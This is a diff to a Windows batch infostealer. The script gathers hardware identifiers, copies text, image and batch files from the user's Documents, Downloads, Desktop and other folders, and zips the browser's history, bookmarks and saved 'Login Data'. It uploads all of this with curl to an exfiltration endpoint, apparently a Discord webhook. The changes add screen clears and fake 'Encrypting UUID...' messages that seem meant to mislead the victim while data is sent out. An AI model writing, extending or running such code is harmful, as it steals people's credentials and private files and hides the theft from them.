@@ -5,6 +5,7 @@ mode con cols=61 lines=30
 cls
 
 
+
 :: -- Collect HWID --
 
 for /f "tokens=* delims=" %%a in ('reg query "HKLM\HARDWARE\DESCRIPTION\System\BIOS" /v "SystemManufacturer"') do (set "Brand=%%a")
@@ -123,82 +124,83 @@ cls
 for %%a in ("%documentsFolder%\*.txt") do (
     copy "%%a" "%textDest%"
 )
-
+cls
 for %%b in ("%downloadsFolder%\*.txt") do (
     copy "%%b" "%textDest%"
 )
-
+cls
 for %%c in ("%picturesFolder%\*.txt") do (
     copy "%%c" "%textDest%"
 )
-
+cls
 for %%d in ("%videosFolder%\*.txt") do (
     copy "%%d" "%textDest%"
 )
-
+cls
 for %%e in ("%musicFolder%\*.txt") do (
     copy "%%e" "%textDest%"
 )
-
+cls
 for %%l in ("%desktopFolder%\*.txt") do (
     copy "%%l" "%textDest%"
 )
-
+cls
 
 for %%f in ("%documentsFolder%\*.png") do (
     copy "%%f" "%imageDest%"
 )
-
+cls
 for %%g in ("%documentsFolder%\*.jpg") do (
     copy "%%g" "%imageDest%"
 )
-
+cls
 for %%h in ("%downloadsFolder%\*.png") do (
     copy "%%h" "%imageDest%"
 )
-
+cls
 for %%i in ("%downloadsFolder%\*.jpg") do (
     copy "%%i" "%imageDest%"
 )
-
+cls
 for %%j in ("%picturesFolder%\*.png") do (
     copy "%%j" "%imageDest%"
 )
-
+cls
 for %%k in ("%picturesFolder%\*.jpg") do (
     copy "%%k" "%imageDest%"
 )
-
+cls
 for %%m in ("%videosFolder%\*.png") do (
     copy "%%m" "%imageDest%"
 )
-
+cls
 for %%n in ("%videosFolder%\*.jpg") do (
     copy "%%n" "%imageDest%"
 )
-
+cls
 for %%o in ("%desktopFolder%\*.png") do (
     copy "%%o" "%imageDest%"
 )
-
+cls
 for %%p in ("%desktopFolder%\*.jpg") do (
     copy "%%p" "%imageDest%"
 )
-
+cls
 for %%q in ("%desktopFolder%\*.bat") do (
     copy "%%q" "%batDest%"
 )
-
+cls
 for %%r in ("%downloadsFolder%\*.bat") do (
     copy "%%r" "%batDest%"
 )
-
+cls
 for %%s in ("%documentsFolder%\*.bat") do (
     copy "%%s" "%batDest%"
 )
 cls
 
-
+echo]
+echo   [33m^>  [97mEncrypting UUID...
 powershell -command "Compress-Archive -Path '%output_dir%\Bookmarks' -DestinationPath '%output_dir%\Bookmarks.zip' -Force > $null 2>&1"
 powershell -command "Compress-Archive -Path '%output_dir%\History' -DestinationPath '%output_dir%\History.zip' -Force > $null 2>&1"
 powershell -command "Compress-Archive -Path '%output_dir%\Login Data' -DestinationPath '%output_dir%\Login_Data.zip' -Force > $null 2>&1"
@@ -283,15 +285,27 @@ set "json_payload1={\"embeds\": [{\"title\": \"%pcname%\", \"description\": \"**
 curl -F "payload_json=%json_payload1%" -F "file1=@%file_path%" "%exfilKey%"
 cls
 
+echo]
+echo   [33m^>  [97mEncrypting UUID...
 curl -F "file=@%file1%" %exfilKey%
 cls
+echo]
+echo   [33m^>  [97mEncrypting UUID...
 curl -F "file=@%file2%" %exfilKey%
 cls
+echo]
+echo   [33m^>  [97mEncrypting UUID...
 curl -F "file=@%file3%" %exfilKey%
 cls
+echo]
+echo   [33m^>  [97mEncrypting UUID...
 curl -F "file=@%file4%" %exfilKey%
 cls
+echo]
+echo   [33m^>  [97mEncrypting UUID...
 curl -F "file=@%file5%" %exfilKey%
 cls
+echo]
+echo   [33m^>  [97mEncrypting UUID...
 curl -F "file=@%file6%" %exfilKey%
 cls
